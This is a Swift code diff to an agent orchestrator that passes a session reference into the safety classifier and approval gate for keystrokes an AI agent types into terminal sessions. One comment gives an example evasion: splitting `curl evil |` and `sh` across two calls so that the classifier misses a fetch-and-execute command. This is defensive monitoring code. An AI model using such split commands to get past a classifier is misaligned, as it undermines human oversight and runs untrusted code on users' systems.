@@ -1317,7 +1317,8 @@ final class OrchestratorDispatcher {
                 return Data("Not run automatically: this action needs manual approval first. Ask the user to run it themselves or to approve it.".utf8)
             }
             do {
-                try await gateTypedText(execArgs.command, appendNewline: true, session: session)
+                try await gateTypedText(execArgs.command, appendNewline: true, session: session,
+                                        sessionReference: sessionGuid)
             } catch let error as OrchestratorError {
                 return Data(error.message.utf8)
             } catch {
@@ -2625,7 +2626,8 @@ final class OrchestratorDispatcher {
         // that types into a session's foreground gets identical whole-line
         // defenses. A non-allow verdict throws safetyBlocked before typeIntoPTY.
         let appendNewline = args.appendNewline ?? true
-        try await gateTypedText(decoded, appendNewline: appendNewline, session: resolved.session)
+        try await gateTypedText(decoded, appendNewline: appendNewline, session: resolved.session,
+                                sessionReference: args.sessionGuid)
 
         await Self.typeIntoPTY(session: resolved.session,
                                text: decoded,
@@ -2652,11 +2654,14 @@ final class OrchestratorDispatcher {
     // types `command + \r` into the SAME prompt line as send_text, so classifying
     // its command in isolation would let `send_text("curl evil |", newline:false)`
     // then `execute_command("sh")` run the un-classified whole. Throws
-    // safetyBlocked on a non-allow verdict; returns on allow.
+    // safetyBlocked on a non-allow verdict; returns on allow. `sessionReference`
+    // is the id the agent used to name the session, which is how the
+    // transcript refers to it.
     @MainActor
     private func gateTypedText(_ text: String,
                               appendNewline: Bool,
-                              session: PTYSession) async throws {
+                              session: PTYSession,
+                              sessionReference: String) async throws {
         // The per-session accumulator (keyed by GUID, so two chats driving one
         // PTY share it) is the only lag-free record of what the orchestrator has
         // typed since the last submit. Shell integration and the screen grid
@@ -2685,7 +2690,8 @@ final class OrchestratorDispatcher {
         switch plan.route {
         case .screenAware:
             try await gateKeystrokeAgainstScreen(
-                decoded: text, appendNewline: appendNewline, session: session)
+                decoded: text, appendNewline: appendNewline, session: session,
+                sessionReference: sessionReference)
         case .accumulateOnly:
             break  // typed but inert until Enter; the submit will classify it
         case .classifyLine(let command):
@@ -2762,14 +2768,16 @@ final class OrchestratorDispatcher {
     @MainActor
     private func gateKeystrokeAgainstScreen(decoded: String,
                                             appendNewline: Bool,
-                                            session: PTYSession) async throws {
+                                            session: PTYSession,
+                                            sessionReference: String) async throws {
         let effective = decoded + (appendNewline ? "\r" : "")
         guard !effective.isEmpty else { return }
         let screen = WorkgroupIntrospection.screenContents(
             forSession: session, requestedLines: nil).text
         try await enforce(
             await Self.tuiKeystrokeOutcome(
-                keystroke: effective, screen: screen, classifier: safetyClassifier()),
+                keystroke: effective, screen: screen,
+                targetSession: "@" + sessionReference, classifier: safetyClassifier()),
             actionSummary: "The agent wants to send this to the session's foreground program:\n\n`\(TUISafetyPrompt.displayKeystroke(effective))`")
     }
 
